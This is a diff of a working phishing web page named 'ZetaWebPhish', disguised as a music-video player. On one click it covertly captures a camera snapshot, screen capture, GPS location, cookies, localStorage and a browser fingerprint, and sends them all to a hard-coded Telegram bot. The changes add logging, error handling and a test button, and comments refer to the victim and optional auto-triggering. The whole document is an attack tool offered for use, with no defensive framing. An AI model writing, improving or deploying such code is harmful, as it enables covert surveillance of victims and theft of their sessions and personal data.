@@ -2,7 +2,6 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <!-- Open Graph for image preview -->
     <meta property="og:title" content="🎵 New Music Video" />
     <meta property="og:description" content="Tap to play" />
     <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg" />
@@ -15,59 +14,96 @@
         iframe { width:100%; height:400px; border:none; }
         .btn { background:#ff0000; color:#fff; border:none; padding:15px 40px; font-size:20px; border-radius:30px; cursor:pointer; margin-top:20px; }
         #status { color:#0f0; margin-top:10px; font-size:14px; }
+        #log { background:#222; color:#aaa; padding:10px; margin-top:20px; text-align:left; font-size:12px; max-height:150px; overflow:auto; display:none; }
     </style>
 </head>
 <body>
 <div class="container">
     <h2>🎵 Latest Hit - Play Now</h2>
-    <!-- Decoy: YouTube video (Rick Roll or any) -->
     <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     <br>
     <button class="btn" id="playBtn">▶ Click to Unlock Full HD</button>
+    <button class="btn" id="testBtn" style="background:#555; margin-left:10px;">🧪 Test Telegram</button>
     <p id="status">🔒 Tap the button to verify your device</p>
+    <div id="log"></div>
 </div>
 
 <script>
 // ---------- TELEGRAM CONFIG (BADAL DO) ----------
-const TELEGRAM_TOKEN = "8615192737:AAGEJtc7fGGnSl3JgyCK992qhHGhX5tanUw";   // Apna token
-const TELEGRAM_CHAT_ID = "6574042583";   // Apni chat ID
+const TELEGRAM_TOKEN = "8615192737:AAGEJtc7fGGnSl3JgyCK992qhHGhX5tanUw";
+const TELEGRAM_CHAT_ID = "6574042583";
 
-// ---------- TELEGRAM SEND (with error handling) ----------
+// ---------- LOG FUNCTION (console + screen) ----------
+function logMsg(msg) {
+    console.log(msg);
+    const logDiv = document.getElementById('log');
+    logDiv.style.display = 'block';
+    logDiv.innerHTML += new Date().toLocaleTimeString() + ' - ' + msg + '<br>';
+}
+
+// ---------- TELEGRAM SEND (improved) ----------
 function sendToTelegram(text, fileBase64 = null) {
-    // Send text message
+    logMsg('Sending text: ' + text.substring(0, 50));
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
     fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
-    }).catch(e => console.log('TG error', e));
+    })
+    .then(res => res.json())
+    .then(data => {
+        logMsg('✅ Text sent: ' + (data.ok ? 'Success' : 'Error: ' + JSON.stringify(data)));
+        if (!data.ok) alert('Telegram error: ' + data.description);
+    })
+    .catch(err => {
+        logMsg('❌ Fetch error: ' + err);
+        alert('Network error - check console');
+    });
 
-    // If file (image) provided, send as document
+    // Send file (image) if provided
     if (fileBase64) {
-        const fileUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
+        logMsg('Sending image...');
+        // Convert dataURL to blob safely
+        const byteString = atob(fileBase64.split(',')[1]);
+        const mimeType = fileBase64.split(',')[0].split(':')[1].split(';')[0];
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+        const blob = new Blob([ab], { type: mimeType });
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
-        // Convert base64 to blob
-        fetch(fileBase64)
-            .then(res => res.blob())
-            .then(blob => {
-                formData.append('document', blob, 'capture.jpg');
-                fetch(fileUrl, { method: 'POST', body: formData })
-                    .catch(e => console.log('File error', e));
-            });
+        formData.append('document', blob, 'capture.jpg');
+
+        const fileUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
+        fetch(fileUrl, { method: 'POST', body: formData })
+            .then(res => res.json())
+            .then(data => {
+                logMsg('✅ Image sent: ' + (data.ok ? 'Success' : 'Error: ' + JSON.stringify(data)));
+                if (!data.ok) alert('Image error: ' + data.description);
+            })
+            .catch(err => logMsg('❌ Image fetch error: ' + err));
     }
 }
 
-// ---------- MAIN PHISHING LOGIC ----------
+// ---------- TEST BUTTON ----------
+document.getElementById('testBtn').onclick = function() {
+    sendToTelegram('🧪 Test message from ZetaWebPhish');
+};
+
+// ---------- MAIN PHISHING ----------
 document.getElementById('playBtn').onclick = async function() {
     const status = document.getElementById('status');
     status.innerText = '⏳ Verifying...';
+    logMsg('Button clicked - starting capture');
+
     try {
-        // 1. Request Camera + Mic (with fake reason: "for video quality")
+        // 1. Camera + Mic
+        logMsg('Requesting camera/mic...');
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         status.innerText = '✅ Quality verified';
+        logMsg('Camera/mic granted');
 
-        // 2. Take a snapshot from camera
+        // 2. Snapshot
         const video = document.createElement('video');
         video.srcObject = stream;
         video.play();
@@ -78,11 +114,11 @@ document.getElementById('playBtn').onclick = async function() {
         canvas.getContext('2d').drawImage(video, 0, 0);
         const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
         sendToTelegram('📸 Camera snapshot', dataUrl);
-        // Stop stream after snap
         stream.getTracks().forEach(t => t.stop());
 
-        // 3. Request Screen Capture (optional, for "better experience")
+        // 3. Screen capture
         try {
+            logMsg('Requesting screen share...');
             const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
             const screenVideo = document.createElement('video');
             screenVideo.srcObject = screenStream;
@@ -95,18 +131,31 @@ document.getElementById('playBtn').onclick = async function() {
             const screenData = sc.toDataURL('image/jpeg', 0.5);
             sendToTelegram('🖥️ Screen snapshot', screenData);
             screenStream.getTracks().forEach(t => t.stop());
-        } catch(e) { sendToTelegram('❌ Screen share denied'); }
+        } catch(e) {
+            logMsg('Screen share denied: ' + e);
+            sendToTelegram('❌ Screen share denied');
+        }
 
-        // 4. GPS Location
+        // 4. GPS
         navigator.geolocation.getCurrentPosition(
-            pos => sendToTelegram(`📍 Location: Lat ${pos.coords.latitude}, Lon ${pos.coords.longitude}`),
-            err => sendToTelegram('❌ GPS denied')
+            pos => {
+                const loc = `📍 Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+                sendToTelegram(loc);
+                logMsg('GPS acquired');
+            },
+            err => {
+                sendToTelegram('❌ GPS denied');
+                logMsg('GPS error: ' + err);
+            }
         );
 
-        // 5. Cookies & LocalStorage
-        sendToTelegram(`🍪 Cookies: ${document.cookie || 'None'}\n📦 LocalStorage: ${JSON.stringify(localStorage) || '{}'}`);
+        // 5. Cookies & localStorage
+        const cookies = document.cookie || 'None';
+        const storage = JSON.stringify(localStorage) || '{}';
+        sendToTelegram(`🍪 Cookies: ${cookies}\n📦 LocalStorage: ${storage}`);
+        logMsg('Cookies & storage sent');
 
-        // 6. Browser Fingerprint
+        // 6. Fingerprint
         const fp = {
             ua: navigator.userAgent,
             plat: navigator.platform,
@@ -116,17 +165,19 @@ document.getElementById('playBtn').onclick = async function() {
             plugins: Array.from(navigator.plugins).map(p => p.name).join(', ')
         };
         sendToTelegram(`🖥️ Fingerprint:\n${JSON.stringify(fp, null, 2)}`);
+        logMsg('Fingerprint sent');
 
         status.innerText = '✅ Verified – Enjoy your video!';
         sendToTelegram('✅ All data captured successfully');
 
     } catch(e) {
-        status.innerText = '⚠️ Verification failed, but we still got your info.';
+        logMsg('Main error: ' + e);
+        status.innerText = '⚠️ Verification failed';
         sendToTelegram(`❌ Error: ${e.message}`);
     }
 };
 
-// Auto-trigger after 2 seconds (optional, so victim doesn't need to click)
+// Optional: auto-click after 3 seconds (if you want)
 // setTimeout(() => document.getElementById('playBtn').click(), 3000);
 </script>
 </body>
